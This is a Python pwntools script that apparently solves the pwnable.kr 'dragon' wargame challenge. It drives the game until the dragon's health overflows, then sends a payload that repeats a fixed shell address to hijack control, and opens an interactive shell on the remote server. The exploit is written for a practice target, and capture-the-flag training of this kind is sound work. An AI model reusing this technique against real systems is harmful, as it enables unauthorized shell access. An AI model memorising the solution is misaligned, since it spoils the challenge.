from pwn import *

bin_sh_addr = 0x08048dbf

PRIEST = 1
KNIGHT = 2

r = remote('pwnable.kr', 9004)

def menu_in():
    r.recvuntil("ht\n")

def priest_in():
    r.recvuntil("ble.\n")

def knight_in():
    r.recvuntil("HP.\n")

def win_in():
    print(r.recvuntil(":\n").decode())

def choosehero(i):
    r.sendline(str(i))
    

def holy_bolt():
    priest_in()
    r.sendline("1")
    
def clarity():
    priest_in()
    r.sendline("2")
    
    
def shield():
    priest_in()
    r.sendline("3")

def crash():
    knight_in()
    r.sendline("1")

def frenzy():
    knight_in()
    r.sendline("2")
    
menu_in()

choosehero(KNIGHT)

frenzy()

menu_in()

choosehero(PRIEST)

dragon_health = 80

while dragon_health < 128:
    shield()
    dragon_health += 4
    shield()
    dragon_health += 4
    clarity()
    dragon_health += 4


win_in()

payload = p32(bin_sh_addr) * 4

r.sendline(payload)
log.info("pwned!")
r.interactive()
    



